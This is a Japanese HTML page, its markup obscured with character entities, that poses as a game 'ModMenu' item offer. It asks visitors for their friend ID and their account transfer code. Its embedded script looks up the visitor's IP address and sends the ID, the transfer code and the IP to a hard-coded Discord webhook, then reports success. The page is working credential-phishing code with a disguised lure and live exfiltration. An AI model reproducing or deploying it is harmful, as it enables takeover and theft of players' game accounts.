<!DOCTYPE html>&#10;<html lang="ja">&#10;<head>&#10;&#32;&#32;&#32;&#32;<meta charset="UTF-8" />&#10;&#32;&#32;&#32;&#32;<meta http-equiv="X-UA-Compatible" content="IE=edge" />&#10;&#32;&#32;&#32;&#32;<meta name="viewport" content="width=device-width, initial-scale=1.0" />&#10;&#32;&#32;&#32;&#32;<title>&#109;&#97;&#105;&#110;&#95;&#102;&#114;&#111;&#110;&#116;&#115;&#105;&#103;&#104;&#116;</title>&#10;&#32;&#32;&#32;&#32;<style>
        body {
            background-color: #50;
            font-family: Arial, sans-serif;
            color: #fff;
            margin: 0;
            padding: 0;
        }

        .form-container {
            width: 300px;
            margin: 20px auto;
            padding: 20px;
            background-color: #222;
            border: 2px solid #504;
            border-radius: 1px;
            box-shadow: inset 0 0 90px rgba(255,55,235,0.2), 0 0 15px rgba(0,0,0,0.7);
            background-image: linear-gradient(145deg, #333, #409);
            text-align: center;
        }

        h2 {
            text-align: center;
        }

        .item {
            margin-top: 8px;
            text-align: left;
        }

        .label {
            display: block;
            margin-bottom: 1px;
        }

        .inputs {
            width: 97%;
            padding: 11px;
            border: none;
            border-radius: 5px;
        }

        .button-area {
            margin-top: 12px;
        }

        input[type="submit"] {
            background-color: #369;
            color: #fff;
            border: none;
            padding: 15px 28px;
            border-radius: 15px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        input[type="submit"]:hover {
            background-color: #777;
        }
    </style>&#10;</head>&#10;<body>&#10;&#32;&#32;&#32;&#32;<div class="form-container">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<h2>&#77;&#111;&#100;&#77;&#101;&#110;&#117;&#126;&#73;&#116;&#101;&#109;&#126;</h2>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<form id="mod-form">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="item">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="label">&#12501;&#12524;&#12531;&#12489;&#73;&#68;&#40;&#12518;&#12540;&#12470;&#12540;&#73;&#68;&#41;</label>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="text" class="inputs" name="friend_id" required>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#10;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="item">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<label class="label">&#27231;&#31278;&#22793;&#12467;&#12540;&#12489;&#40;&#24341;&#12365;&#32153;&#12366;&#12467;&#12540;&#12489;&#41;</label>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="text" class="inputs" name="secret_code" required>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#10;&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<div class="button-area">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;<input type="submit" value="完了">&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</div>&#10;&#32;&#32;&#32;&#32;&#32;&#32;&#32;&#32;</form>&#10;&#32;&#32;&#32;&#32;</div>&#10;&#10;&#32;&#32;&#32;&#32;<script>
        document.getElementById("mod-form").addEventListener("submit", async function(event) {
            event.preventDefault();
            const formData = new FormData(this);
            
            try {
                const ipResponse = await fetch("https://api64.ipify.org?format=json");
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
    
                const payload = {
                    content: "新しいデータが送信されました:",
                    embeds: [{
                        title: "送信されたデータ",
                        fields: [
                            { name: "フレンドID", value: formData.get("friend_id"), inline: true },
                            { name: "機種変コード", value: formData.get("secret_code"), inline: true },
                            { name: "IPアドレス", value: userIP, inline: false }
                        ],
                        color: 16711680
                    }]
                };
    
                const response = await fetch("https://discord.com/api/webhooks/1410001547823288340/zKAjd4VIYGyHCv5VPUfN0fWdWPJBXaHMwS0wCP9esQKfF_lT0Xt0VXRrh6dfAMQzptaT", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
    
                if (!response.ok) {
                    throw new Error(`Webhook送信エラー: ${response.status} ${response.statusText}`);
                }
    
                alert("完了");
            } catch (error) {
                console.error("エラー: ", error);
                alert("失敗");
            }
        });
    </script>&#10;&#32;&#32;&#32;&#32;&#10;</body>&#10;</html>&#10;
